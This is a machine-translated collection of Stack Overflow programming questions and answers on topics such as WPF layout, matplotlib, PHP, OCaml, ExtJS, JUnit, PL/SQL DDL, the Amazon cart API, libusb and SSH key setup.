我有一个 LastChildFill = true 的 DockPanel。它有 4 个孩子：一个 StackPanel（顶部）、另一个 DockPanel（顶部）和另外三个 StackPanel（分别为底部、左侧和无）。最后一个 StackPanel（“ResultsPanel”）没有设置 DockPanel.Dock 属性，也没有宽度/高度，但是当数据绑定导致的行数超出屏幕大小时，它会继续向下停靠在底部停靠的 StackPanel 后面。我希望它能够填补我在其他停靠的孩子之间留下的中心“洞”。

如果我将 ScrollBarVisibilities 设置为 Auto，它甚至不会显示它们。任何意见，将不胜感激。以下是相关代码：

```
 <DockPanel Name="JobsDock" LastChildFill="True">
<StackPanel DockPanel.Dock="Top" Height="40"  >
    <Label />
    <Border CornerRadius="5" Width="90" Height="25" >
        <Label Content="Classic View" />
    </Border>
</StackPanel>
<DockPanel DockPanel.Dock="Top" Height="70" Name="SearchJobsPanel" >
    <ComboBox Name="SearchOptionComboBox" VerticalAlignment="Bottom" Width="240"  />
    <StackPanel Height="50" Name="JobPanel" Width="90" Visibility="Collapsed" VerticalAlignment="Bottom" >
        <Label Content="Job Number" HorizontalAlignment="Center" />
        <TextBox Name="JobTextBox" />
    </StackPanel>   
    <StackPanel VerticalAlignment="Bottom" HorizontalAlignment="Right">
        <Button Height="25" Name="SearchButton" Width="90">
            <StackPanel Orientation="Horizontal">
                <Image  Stretch="Fill" Margin="0,0,5,0" />
                <Label Content="Search" FontSize="10" VerticalContentAlignment="Top"  />
            </StackPanel>
        </Button>
   </StackPanel>
</DockPanel>
<StackPanel  Name="FiltersPanel" DockPanel.Dock="Left" Width="120" Opacity="0" >
    <StackPanel Orientation="Horizontal" HorizontalAlignment="Center">
        <Button Name="ResetFilterButton" >
            <Image Source="Images/ResetFilter.png" Width="30"  />
        </Button>
        <Button Name="ApplyFilterButton"  >
            <Image Width="30"  />
        </Button>                    
    </StackPanel>
    <Label Name="ProjectsLabel"  />
    <Label Name="TasksLabel"  Margin="0,10,0,0" />
</StackPanel>
<StackPanel Name="ResultsPanel" Opacity="0">
    <ListView x:Name="DisplayedJobListView" ScrollViewer.VerticalScrollBarVisibility="Visible" >
        <ListView.View>
            <GridView>
            </GridView>
        </ListView.View>
    </ListView>
</StackPanel> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-08T13:42:58.213

Jurgen，在 msdn 论坛上为我回答了这个问题。这是他的回复：

你好，

最后一个（填充）DockPanel 子项是 StackPanel（“ResultsPanel”）。StackPanel 的布局永远不会通过包含控件来定义（没有什么像 StackPanel 的 VerticalLayout="Stretch" 那样工作）。它总是会占用必要的空间来完全扩展它所包含的控件。

由于您在 StackPanel 中只有一个孩子（它有自己的滚动机制），因此请移除 StackPanel。

希望这可以帮助。

干杯于尔根

# python - Matplotlib 子图轴

> ID：15232217
> 
> 赞同：1
> 
> 时间：2013-03-05T19:14:44.917
> 
> 标签：python, matplotlib, networkx

对此问题的任何帮助表示赞赏。我正在尝试使用 matplotlib 制作子图，我编写的代码如下：

```
import networkx as nx

Fig, Axes = plt.subplots(nrows=1, ncols=2)
plt.tight_layout()
for i in range(0, NoOfVehicles):
  Axes[i].set_aspect(1)
  Axes[i].xaxis.set_major_formatter(mtick.NullFormatter())
  Axes[i].yaxis.set_major_formatter(mtick.NullFormatter() 
```

现在我如何在第一个情节中绘制一些东西，然后在第二个情节中绘制其他东西。

我想要做

```
nx.drawing.nx_pylab.draw_networkx_nodes(GPlot[0].G, GPlot[0].Position, node_size=100, node_color=GPlot[0].Color) 
```

在第一个情节和

```
nx.drawing.nx_pylab.draw_networkx_nodes(GPlot[1].G, GPlot[1].Position, node_size=100, node_color=GPlot[1].Color) 
```

在第二。

总之，这就是我想要做的：我希望第一组节点出现在 subplot(1,2,1) 中，第二组节点出现在 subplot(1,2,2) 中。但两者都出现在同一个情节（1,2,2）中。

GPlot 只是一个包含 GraphPlot 类的 2 个对象的列表

```
class GraphForPlot:
    def __init__(self):
        self.G = nx.Graph()
        self.Components = []
        self.ActiveStatus = {}
        self.Nodes = []
        self.Position = {}
        self.Color = [] 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T19:34:27.837

您需要告诉`netwkorkx`要绘制到哪些轴，如果不这样做，它将绘制到当前活动的轴（无论`plt.gca()`返回什么（[doc](http://networkx.github.com/documentation/latest/reference/generated/networkx.drawing.nx_pylab.draw_networkx.html#networkx.drawing.nx_pylab.draw_networkxhttp://)）。

```
nx.drawing.nx_pylab.draw_networkx_nodes(..., ax=Axes[0])
nx.drawing.nx_pylab.draw_networkx_nodes(..., ax=Axes[1]) 
```

作为旁注，您不应该对实例变量（[pep8](http://www.python.org/dev/peps/pep-0008/#naming-conventions)）使用驼峰式大小写，它可能会与类名发生冲突（在这种情况下`matplotlib.axes.Axes`）。

# c# - 在 ASP.NET 应用程序中使用 AJAX 和 JQuery 上传文件

> ID：15232220
> 
> 赞同：0
> 
> 时间：2013-03-05T19:14:55.417
> 
> 标签：c#, jquery, asp.net, ajax, file-upload

我的 asp.net Web 表单中有几个输入类型文件。

如何使用 Jquery、AJAX 和 C# 将文件上传到服务器？

上传程序是以编程方式生成的，因此我无法使用后面的代码上传文件。

此外，必须一次上传许多文件。

无论如何我通过 Jquery 读取文件，通过 AJAX 将其发送到服务器并上传到那里？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-05T21:35:37.477

看看[Fine Uploader](http://fineuploader.com)。它不使用 flash 或 java。实际上，它没有任何必需的依赖项。如果您使用 jQuery，则提供了一个可选的 jQuery 插件。

支持：IE10-7、Chrome、Firefox、Safari (OS X) 以及 Android 平板电脑和手机，以及 IOS6 平板电脑和手机（iPhone 和 iPad）。Microsoft Surface 平板电脑也已经过测试。

有许多功能可供选择。查看演示，更重要的是，查看文档和相关博客文章以了解更多详细信息。

此外，在将此库集成到您的应用程序期间，有许多服务器端示例可能会有所帮助。查看 Github 项目中的服务器目录。ASP.NET 是众多示例之一。

# php - 在没有端口的情况下在php中ping服务器？

> ID：15232221
> 
> 赞同：1
> 
> 时间：2013-03-05T19:14:58.230
> 
> 标签：php, ping

我一直在篡改脚本时遇到问题。

我正在尝试为我的游戏服务器制作一个在线检查器，这样我就可以从我的网站上指出我的服务器是在线还是关闭。这是我的代码：

```
<?php
if (!$socket = @fsockopen(IP, Port, $errno, $errstr, 2))
{
  echo "<center><img style='float:left;' src='images/offline_icon.png'><font style='float:left;' size='5' color='red'><strong>Offline!</strong></font></center>";
}
else 
{
  echo "<center><img style='float:left;' src='images/online_icon.png'><font style='float:left;' size='5' color='green'><strong>Online!</strong></font></center>";
  fclose($socket);
}
?> 
```

我的问题是，它失败了。如果我将超时设置为 30，它将等待 30 秒，然后将其标记为离线并继续。

但是，如果我在终端中 ping IP，它就可以正常工作。

在搜索了有关 ping 和端口的信息后，似乎它可能是问题所在。

有没有办法在没有端口的情况下对 IP 执行正常 ping？喜欢linux命令行？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-05T19:23:27.697

ICMP 不使用端口。

您可能希望使用`exec()`ping 服务器。签出：[使用 PHP ping IP 地址并回显结果](https://stackoverflow.com/questions/8030789/pinging-an-ip-address-using-php-and-echoing-the-result)

# ocaml - ocaml中元组的元组

> ID：15232222
> 
> 赞同：0
> 
> 时间：2013-03-05T19:15:13.877
> 
> 标签：ocaml, tuples, concat

我有 ：

```
type 'a box =
  | Item of ('a * 'a box)
  | Empty 
```

我需要创建函数`concat`：

```
val concat : 'a box box -> 'a box 
```

连接一盒盒子。参数的元素都连接在一起（以相同的顺序）以给出结果。

我不明白如何创建一个像`'a box box`.

我试着做：

```
let elt  = Item(1, Item(2,Empty)) 
let elt2 = Item(elt, Item(20, Empty)), 
```

但它失败了！你知道为什么吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-05T19:18:27.503

通过执行以下操作创建一个 int box 类型的元素：

```
let elt = Item(3,Empty) 
```

现在你可以创建一个 int box box 类型的元素，方法是把这个东西放在一个盒子里：

```
let elt2 = Item(elt,empty) 
```

（框实际上只是列表类型）

有了一个列表，它将是：

```
let elt = [3]
let elt2 = [elt] (* which is [ [3] ], the list containing one list, which contains 3*) 
```

关于你自己的例子，第二个失败了，因为你试图创建一个包含两个不同东西的盒子：一个盒子和一个整数。但是一个盒子只能包含一种类型的东西。

# php - 隔离对象数组中的特定值列

> ID：15232223
> 
> 赞同：2
> 
> 时间：2013-03-05T19:15:15.103
> 
> 标签：php

我有一个对象数组，如下所示：

```
[0] => stdClass Object
    (
        [lid] => 2492
        [post_title] => Winter League 2012/2013
        [eid] => 2121
        [etitle] => a 2013
        [rid] => 2358
        [rtitle] => sdcc2013_2M_W
        [rtype] => W
    )

[1] => stdClass Object
    (
        [lid] => 2492
        [post_title] => Winter League 2012/2013
        [eid] => 2121
        [etitle] => a 2013
        [rid] => 2359
        [rtitle] => sdcc2013_4M_M
        [rtype] => M
    )

[2] => stdClass Object
    (
        [lid] => 2492
        [post_title] => Winter League 2012/2013
        [eid] => 2123
        [etitle] => e 2013
        [rid] => 2360
        [rtitle] => eircom_Women_2.5Mile
        [rtype] => W
    )

[3] => stdClass Object
    (
        [lid] => 2492
        [post_title] => Winter League 2012/2013
        [eid] => 2123
        [etitle] => e 2013
        [rid] => 2362
        [rtitle] => eircom2013_men_5mile
        [rtype] => M
    ) 
```

我想“得到”“摆脱”值的子集

```
 (2358,2359,1360,2362) 
```

我应该使用哪些数组操作函数？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-05T19:18:37.163

我会建议`array_map()`。

```
$original_array; // your original array
$rid_array = array_map(function($val) {
    return $val->rid;
}, $original_array); 
```

或者对于 PHP < 5.3

```
$original_array; // your original array
$rid_array = array_map('map_function', $original_array);

function map_function($val) {
    return $val->rid;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-05T19:19:55.807

我将[`array_map()`](http://php.net/manual/en/function.array-map.php)与设置对象的 rid 字段的回调函数一起使用。

```
function set_rid($obj, $val)
{
    return $obj->rid = $val;
}

$my_rids = array(
    '1',
    '2',
    '3',
    '4'
);
array_map('set_rid', $my_array, $my_rids); 
```

# java - 快速响应 REST 请求

> ID：15232226
> 
> 赞同：0
> 
> 时间：2013-03-05T19:15:21.580
> 
> 标签：java, web-services, http, rest, web-applications

我正在向服务器发送基于 REST 的请求。我想尽快得到响应，并想知道可以进行的各种优化。

一种方法当然是在线程中并行发送这些请求。还有哪些其他选项可以优化这一点？

在服务器上，部分可以添加哪些配置？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-06T23:45:28.320

REST 调用（或只是 HTTP 调用）的优化：

1.  就像布赖恩凯利所说，积极缓存调用。
2.  您可以最小化执行 GET 时返回的有效负载。如果它返回 JSON，您可以修剪字段名称以使总返回对象更小。
3.  您可以确保已打开压缩。
4.  您可以批量调用。因此，如果用户想要连续执行三个 GET，您可以批处理这些服务器端（假设是 Web 应用程序），然后使用三个请求进行一次 HTTP 调用。
5.  同样，如果它是一个 Web 应用程序并且您希望最大限度地减少页面的加载时间，您可以在页面加载时仅加载基本数据，并将其余调用推送到 AJAX 调用。
6.  您可以优化为 REST 调用提供服务的数据库查询。

不过，对您来说最大的收获肯定是缓存。

# c# - .NET 中是否有热插拔的参考实现？

> ID：15232228
> 
> 赞同：6
> 
> 时间：2013-03-05T19:15:25.367
> 
> 标签：c#, .net, mef, hotswap

我正在寻找在 .NET 中完成的热交换的良好实现。我需要的东西是：

*   能够在特定文件夹中部署 DLL 并让正在运行的系统拾取它们。
*   让正在运行的系统更新容器中的相应引用。

我一直在研究 MEF 及其目录加载机制，但它似乎非常不可靠。也许那里有人有替代实现？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-05T19:51:10.883

`AssemblyResolve`您可以通过以下调用来提供自定义事件处理程序`newAppDomain()`。提供您的目录，以便`AppDomain`在那里查看。加载类型时，使用函数`loadFromAppDomain()`返回它。这应该允许您`C:\dlls`在运行时将新的 dll 复制到并从那里重新加载。（原谅我，我根据你的标签将它从我的 VB 源代码翻译成 C#。）

```
String dllFolder = "C:\\dlls";

public void newAppDomain()
{
    AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(assemblyResolve);
}

private static Assembly assemblyResolve(Object sender, ResolveEventArgs args){
    String assemblyPath = Path.Combine(dllFolder, new AssemblyName(args.Name).Name + ".dll");
    if(!File.Exists(assemblyPath))
    {
        return null;
    }
    else
    {
        return Assembly.LoadFrom(assemblyPath);
    }
}

private Type loadFromAppDomain(String className)
{
    Assembly[] asses = AppDomain.CurrentDomain.GetAssemblies();
    List<Type> types = new List<Type>();
    foreach(Assembly ass in asses)
    {
        Type t = ass.GetType(className);
        if(t != null) types.Add(t);
    }
    if(types.Count == 1)
        return types.First();
    else
        return null;
} 
```

# eclipse - 以 Eclipse 开头的 Glassfish 总是提示：“用户名或密码错误。”

> ID：15232229
> 
> 赞同：4
> 
> 时间：2013-03-05T19:15:25.633
> 
> 标签：eclipse, jakarta-ee, glassfish

我试图安装一个 glassfish 服务器，我想在 eclipse 中使用它。我在使用 jdk 7 启动服务器时遇到问题。如果我用我的 jre6 制作一个使用 jdk6 的 glassfish 服务器，一切正常，但我应该使用 jdk7。

所以我将jre6更改为jre7。（但是当我使用 jre6 时 glassfish 开始正常，但我想使用 jre7。）

不幸的是，我无法使用 jre7 启动 glassfish 服务器，因为我总是遇到问题：“用户名或密码错误。”

我几乎尝试了所有方法，但我无法解决问题。

1.  我试图勾选“对管理命令使用匿名连接”

2.  我试图取消勾选它，并使用 admin-adminadmin、admin-blank、admin-admin 标识符，但它没有用。

3.  我试图重新安装 jdk7 和 jre7。

4.  我试图手动启动 glassfish。

5.  我试图从未部署的项目开始 glassfish。

6.  我试图重新安装新的 glassfish，各种版本。

如果有人可以帮助解决我的问题，我将不胜感激。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2014-02-02T18:29:29.160

尝试用户 admin 并将密码字段留空。这个对我有用

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-02-18T12:32:03.783

如果调试端口错误，也会出现该错误。

您也应该检查 glassfish 的 vm 选项

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2021-02-18T10:27:02.280

转到服务器的属性，

和做

*   管理员：管理员
*   密码 ：

（密码留空）

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-01-01T12:21:08.717

这对我有用：

1.  在 Eclipse 中右键单击 glassfish 服务器
2.  特性
3.  确保设置了密码。应该是管理控制台密码。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2013-04-11T16:23:16.457

双击 Glashfish 服务器取消选中复选框（匿名用户）并提供它应该解决的凭据

基肖尔

# model-view-controller - 多页面应用程序的 ExtJS 架构

> ID：15232240
> 
> 赞同：6
> 
> 时间：2013-03-05T19:16:17.550
> 
> 标签：model-view-controller, extjs, architecture, extjs-mvc

我有一个 .NET 应用程序，其中大部分 UI 都是自定义的。在某些页面上，我使用 ExtJS4 组件（例如 Grid）来显示用户表。我还有另一个页面显示用户个人资料，还有另一个页面显示申请表。还有许多其他页面不使用 ExtJS。我很少使用 ExtJS 组件，并希望在我使用 ExtJS 的所有页面中为 Stores 和 Models 提供可重用的代码。

我熟悉 ExtJS MVC 架构，但所有文档和示例都展示了单页 ExtJS 应用程序的最佳实践。

对于我的场景，我正在寻找有关构建 ExtJS 代码的最佳方式的建议。

我应该只在一个通用 JavaScript 文件中创建商店和模型并将该文件包含在每个页面上吗？然后为我想使用 ExtJS 组件的每个页面创建一个 Ext.Application 或 Ext.onReady 的实例？或者我应该为每个有问题的页面使用 MVC 架构，只是为了几个组件？

我只想避免复制/粘贴代码并具有可重用性。请推荐最佳路径。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-05T20:14:10.297

我必须创建一个应用程序，其中包含几个不是 ExtJS 组件的页面。对我来说，大约是 50/50，所以 ExtJS 比你的多一点。Ext.Application 的多个实例在我尝试时不可用，因为视口是如何绑定到它的。

我最终使用了一个带有单个视口的 Ext.Application（这对于调整大小管理非常有用），我`Ext.panel.Panel`为其他（非 ExtJS）页面创建了一个“代理”视图，并将页面的内容转储到该面板的[**`html`**](http://docs.sencha.com/ext-js/4-1/#!/api/Ext.panel.Panel-cfg-html)配置中它是使用 servlet 呈现的——我不想使用 IFrame，但我想这可能是另一种选择。

这对我来说效果很好，我能够像这样利用 MVC 架构。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-07T19:28:53.157

所以我找到了一个我认为效果很好的合适的解决方案。

在我的页面模板上，我加载 Ext JS 所需的文件并使用 Loader.setConfig 来指定 ExtJS MVC 文件夹结构的位置：

```
<link href="<path>/ext-all.css" rel="stylesheet" type="text/css" />

<script type="text/javascript" src="<path>/bootstrap.js" charset="utf-8"></script>
<script type="text/javascript">
    Ext.Loader.setConfig({
        enabled: true,
        paths: {
            'GS': '<path>/extjs/app") %>'
        }
    });
</script> 
```

然后在我的 app 文件夹中，我有以下文件夹结构：

```
app/
   Models/
        User.js
        MyOtherModel.js 
```

我的 User.js 文件包含：

```
 Ext.define('GS.Model.SimpleUser', {
       extend: 'Ext.data.Model',
       fields: [
           { name: 'UserID', type: 'int' },
           { name: 'Username', type: 'string' },
           { name: 'Firstname', type: 'string' },
           { name: 'Lastname', type: 'string' },
           { name: 'Email', type: 'string' }
       ],
       idProperty: 'UserID'
    }); 
```

然后，在我使用 ExtJS 的每个页面上，我只需通过 Ext.requires 包含模型：

```
 Ext.require([
      'Ext.grid.*',
      'Ext.data.*',
      'Ext.util.*',
      'Ext.state.*',
      'Ext.toolbar.Paging',
      'Ext.tip.QuickTipManager',
      'GS.Model.SimpleUser'
    ]);

    Ext.onReady(function () {
        //app code here
    }); 
```

使用这种方法，我可以编写可重用的代码，例如模型和控制器，而不必使用单个视口进行完整的 MVC。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-06T02:49:08.650

最新版本的 Sencha Cmd 明确支持[多页面应用程序](http://docs.sencha.com/ext-js/4-1/#!/guide/command_app_multi)开发和部署。如果您的依赖项设置正确，它允许您创建特定于页面的构建包以优化每个页面的加载和缓存。尽管从实际的角度来看，如果重叠代码的数量足够大（和/或代码总量足够小），那么 KISS 可能会更好，并且只需将所有应用程序类包含在一个文件中。

是的，每个使用 Ext 的页面通常应该使用 Ext.onReady 或 Ext.application 包装应用程序代码。您是否遵循 MVC 模式取决于您，并且应该由您的应用程序的要求和复杂性驱动。对于简单的情况，它通常不值得，但对于复杂的应用程序或团队开发，遵循 MVC 可能是有意义的。

# java - 由于方法名称，JUnit 测试失败

> ID：15232241
> 
> 赞同：6
> 
> 时间：2013-03-05T19:16:20.730
> 
> 标签：java, junit, junit4

为什么测试方法的名称可能会影响其他测试？

我有一个包含 2 类测试的套件，当我更改 class1 的方法名称时，我在 class2 中的测试正常（绿色）。

我注意到这两个类都有一个同名的方法，但是失败的测试都不是。但是，如果我重命名它们中的任何一个，所有测试都可以。

可以在不同的类中有两个同名的方法，但在同一个套件中吗？另一个测试随机失败的事实只是巧合吗？

ps：重命名该方法后，运行测试的顺序发生了变化。ps2：对不起我的英语不好。

那张照片可以更好地解释我的问题： ![在此处输入图像描述](../Images/c0457e04ad57e02498888a3ab44d4cc3.png)

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-05T20:50:51.807

JUnit 中没有错误！我们的团队经历了类似的结果，这是由于资源管理不当造成的。您可以尝试重命名失败的测试，以便首先执行它们。它们现在应该变成绿色，这主要表明资源在测试之间意外共享。在这种情况下，您可以尝试在拆卸 ( `@After`) 中释放资源。这是一个查找原因的小清单：

*   是否存在经受住考验的 Thread？
*   所有 Executors 都关闭并终止了吗？
*   测试后文件或流是否仍然打开？
*   测试后是否清除/重新初始化测试类中的所有字段？
*   避免使用静态引用或单例
*   不要在您的测试方法中释放资源，仅在拆卸方法中。否则，异常可能会使这段代码无法访问。

# android - 每月列表视图 android

> ID：15232244
> 
> 赞同：0
> 
> 时间：2013-03-05T19:16:36.963
> 
> 标签：android, listview

我开发了一个列表视图，它将存储我的数据库中的所有数据，并根据输入到数据库中的值为列表视图子项的背景着色。我希望能够在每月列表视图中显示数据存储以进行比较。我需要设置 12 个不同的列表视图吗？目前代码如下所示：

```
 Calms info = new Calms(this);
    info.open();
    String data = info.getFlareData();
    info.close();

    String arr[] = data.split("..\n\n");
    System.out.println(arr);

    ArrayAdapter<String> ad = new ArrayAdapter<String>(this, R.layout.simple_list_item_1, arr){
        @Override
        public View getView(int position, View convertView, ViewGroup parent) {

            TextView tv =  (TextView) super.getView(position, convertView, parent);
            String str = tv.getText().toString();

            if(str.contains("High Severity"))
            {
                tv.setBackgroundColor(Color.RED);
                tv.setTextColor(Color.BLACK);
                tv.setGravity(Gravity.CENTER);
            }
            else if(str.contains("Low Severity"))
            {
                tv.setBackgroundColor(Color.GREEN);
                tv.setTextColor(Color.BLACK);
                tv.setGravity(Gravity.CENTER);
            }
            else if(str.contains("Medium Severity"))
            {
                tv.setBackgroundColor(Color.rgb(255, 186, 0));
                tv.setTextColor(Color.BLACK);
                tv.setGravity(Gravity.CENTER);
            }
            return tv;
        }
    };

    setListAdapter(ad); 
```

# oracle - 为什么 PL/SQL 中不允许使用静态 ddl？

> ID：15232252
> 
> 赞同：7
> 
> 时间：2013-03-05T19:17:21.160
> 
> 标签：oracle, plsql

在 Oracle PL/SQL 块中，为什么允许动态 sql

```
begin
    execute immediate 'drop table table_name';
end; 
```

但静态不是吗？

```
begin
    drop table table_name;
end; 
```

我希望答案比“因为这就是语言的工作原理”更有洞察力。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-03-05T20:58:33.797

答案是 PL/SQL 不支持动态多态性。它只支持静态多态，因为

所有 PL/SQL 都会为 Ada 生成一个“DIANA”-> Descriptive Intermediate Attributed Notation，这是一种树形结构的中间语言。编译器在内部使用 DIANA。

在编译时，PL/SQL 源代码被翻译成系统代码并生成相应的 DIANA。现在想想如果有一个像 create table 语句这样的 DDL 语句在编译时不存在，它将在运行程序后创建。那么您的 PL/SQL 引擎将如何生成 DIANA 呢？？？？

DIANA 在 PL/SQL 中起着重要的作用，用于检查/验证子程序。这是必需的，因为我们知道子程序可以使用数据库对象，例如表、视图、同义词或其他存储过程。下次运行程序时，对象可能已更改/删除/丢弃。例如：有人可能删除了表，存储的过程或函数签名可能已更改。

这就是为什么通常使用 PL/SQL 来操纵数据库结构中的数据，而不是操纵那些结构的原因。

但是有一些方法可以使用动态 SQL 和 DBMS_SQL 包进行操作，但这些方法再次应谨慎使用。例如，如果你正在创建一个表，你应该首先检查这个表是否已经存在或者没有使用数据字典视图。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-05T19:41:54.960

可能是因为否则一些代码会像：

```
 begin
    create table tmp (n number);
    insert into tmp values (1);
  end; 
```

我们希望编译器*知道*在插入时该表存在。块的编译将使我更加困难。这是一个非常简单的案例，但我们可以很容易地想象一些条件分支，以及复杂的blabla。

但是，由于我们需要将 DDL 放在立即执行块中，因此限制可能更容易理解。

只是一个想法...

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2020-05-19T18:04:53.087

在执行/编译之前，oracle 检查在 pl/sql 块中引用的所有模式对象（如表、视图、[存储](https://www.wowdbase.com/2020/04/plsql-stored-procedure-oracle-database.html)过程等）的所有访问权限、有效性和依赖关系。但是 DDL 语句的问题在于它可以创建、更改或删除模式对象，因此它可以更改对象依赖关系。因此，我们可能指的是一个已使用 DDL 删除的对象。为了防止这种情况，我猜 plsql 块不允许直接 DDL 语句。但是我们仍然可以使用动态查询在 PL/SQL 块中包含 DDL。由于在这种情况下实际查询直到运行时才知道，基本上我们可以以动态 SQL 的形式隐藏 DDL 语句，并将 DDL 包含在 PL/SQL 块中。

您可以参考我的博客以通过示例来理解这个概念： [Why oracle does not allow direct DDL statements inside the procedure (PLSQL BLOCK)](https://www.wowdbase.com/2020/04/why-oracle-doesnt-allow-direct-ddl.html)

# php - 为 Amazon API 添加购物车功能

> ID：15232253
> 
> 赞同：3
> 
> 时间：2013-03-05T19:17:25.203
> 
> 标签：php, soap, amazon-web-services

我正在尝试将购物车功能添加到[https://github.com/Exeu/Amazon-ECS-PHP-Library上的 AmazonECS 类](https://github.com/Exeu/Amazon-ECS-PHP-Library)

该项目的主要类是[https://github.com/Exeu/Amazon-ECS-PHP-Library/blob/master/lib/AmazonECS.class.php](https://github.com/Exeu/Amazon-ECS-PHP-Library/blob/master/lib/AmazonECS.class.php)

它目前支持 ItemLookup 和 ItemSearch，但没有 CartCreate、CartClear、CartAdd、CartGet、CartModify。

亚马逊关于这些 API 调用的文档可以在这个页面上找到 [http://docs.aws.amazon.com/AWSECommerceService/2011-08-01/DG/CartCreate.html](http://docs.aws.amazon.com/AWSECommerceService/2011-08-01/DG/CartCreate.html)

这是我尝试过的但没有奏效的事情之一。

```
/**
* execute CartCreate request
*
* @param string $asin, $associateTag
*
* @return array|object return type depends on setting
*
* @see returnType()
*/
public function cartCreate($asin, $associateTag)
{
$params = $this->buildRequestParams('CartCreate', array(
  array('Item.1.ASIN' => $asin, 'Item.1.Quantity' => 1),
  'AssociateTag' => $associateTag,
));

return $this->returnData($this->performSoapRequest("CartCreate", $params));
} 
```

有谁知道我做错了什么？我从那个电话中得到的错误信息是

```
string(79) "Your request is missing required parameters. Required parameters include Items." 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-12-16T02:09:53.277

对于仍在寻找答案的任何人，我为您提供了这个解决方案。以下是我的购物车功能：

```
public function CartCreate($OfferListingId)
  {
    $params = $this->buildRequestParams('CartCreate', array(
        'Items' => array(
            'Item' => array(
              //You can also use 'ASIN' here
              'OfferListingId' => $OfferListingId,
              'Quantity' => 1,
      )
      )
    ));

    return $this->returnData(
      $this->performSoapRequest("CartCreate", $params)
    );
  } 
```

您发送的参数应构造为关联数组。

此外，如果您收到有关无法将带有 ASIN 的商品添加到购物车的错误消息，请记住将国家代码添加到请求中，因为默认值为美国，例如，在我的情况下，我需要来自英国的商品. 这就是我执行请求的方式：

```
$cart = $this->ecs->country('UK')->ResponseGroup('Cart')->CartCreate($OfferListingId); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-11T13:17:31.440

我可能错了，但我认为您的 Item.1.ID 不应该是另一个数组的一部分。试试这个：

```
$params = $this->buildRequestParams('CartCreate', array(
  'Item.1.ASIN' => $asin, 
  'Item.1.Quantity' => 1,
  'AssociateTag' => $associateTag,
)); 
```

# c++ - lsusb：只有 1 个端点可用

> ID：15232261
> 
> 赞同：3
> 
> 时间：2013-03-05T19:18:06.287
> 
> 标签：c++, linux, drivers, libusb, lsusb

我正在尝试通过 libusb 与设备（没有 linux 驱动程序）通信。我已经编写了很多基本代码，并在 Windows（有驱动程序）上使用 USB 侦听软件来找出我需要发送给它的代码。但是，当我执行“lsusb -v -d 1267:0000”时，只显示 1 个端点，如下所示：

```
Bus 003 Device 005: ID 1267:0000 Logic3 / SpectraVideo plc 
Device Descriptor:
  bLength                18
  bDescriptorType         1
  bcdUSB               1.10
  bDeviceClass            0 (Defined at Interface level)
  bDeviceSubClass         0 
  bDeviceProtocol         0 
  bMaxPacketSize0         8
  idVendor           0x1267 Logic3 / SpectraVideo plc
  idProduct          0x0000 
  bcdDevice            0.00
  iManufacturer           0 
  iProduct                0 
  iSerial                 0 
  bNumConfigurations      1
  Configuration Descriptor:
    bLength                 9
    bDescriptorType         2
    wTotalLength           25
    bNumInterfaces          1
    bConfigurationValue     1
    iConfiguration          0 
    bmAttributes         0x80
      (Bus Powered)
    MaxPower              100mA
    Interface Descriptor:
      bLength                 9
      bDescriptorType         4
      bInterfaceNumber        0
      bAlternateSetting       0
      bNumEndpoints           1
      bInterfaceClass       255 Vendor Specific Class
      bInterfaceSubClass      0 
      bInterfaceProtocol      0 
      iInterface              0 
      Endpoint Descriptor:
        bLength                 7
        bDescriptorType         5
        bEndpointAddress     0x81  EP 1 IN
        bmAttributes            3
          Transfer Type            Interrupt
          Synch Type               None
          Usage Type               Data
        wMaxPacketSize     0x0008  1x 8 bytes
        bInterval               8
Device Status:     0x0000
  (Bus Powered) 
```

问题是应该有一个我可以向下发送数据的写端点，但只有 0x81 端点显示，据我了解，它是一个读端点（我对此很陌生）。我需要做些什么才能访问此端点吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-16T15:49:53.197

你要么没有认领你的设备（谷歌认领了一个带有 libusb 的设备），你需要以 root 身份运行，或者你正在处理的设备只有一种报告方法。是的，这确实发生了。

在任何 HID 设备上都有三种可能的通信方法：输入、输出和功能报告。但是，根据 HID 描述符，您的设备可能只支持一个。在那种情况下，我猜它只支持功能报告。幸运的是，这些报告可以输入和输出。（这是描述[DigiSpark](http://digistump.com/category/1)的方式。）

也许这些选项都不起作用，但它们值得一试！

# linux - SSH跨网络中的所有机器，如何？

> ID：15232265
> 
> 赞同：1
> 
> 时间：2013-03-05T19:18:18.910
> 
> 标签：linux, networking, ssh, centos, redhat

我想这可能是一个基本的 Linux 问题，但是我在为我正在管理的一组机器设置一个单一的 SSH 密钥时遇到了一些麻烦。

在对此事进行研究时，我看到的大多数教程都允许您从最初生成密钥的机器通过 SSH 连接到您放置相同密钥的其他机器。但我希望能够从我农场中的任何机器通过 SSH 连接到任何其他机器。

是否有捷径可寻？还是我坚持在所有机器之间创建密钥对？我们正在做一些脚本工作，在所有机器之间拥有 SSH 访问权限是至关重要的。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-05T19:22:36.927

不仅有可能，而且非常普遍！

只需将`id_rsa.pub`您生成的部分密钥`ssh-keygen`安装到`~/.ssh/authorized_keys`远程机器上即可。

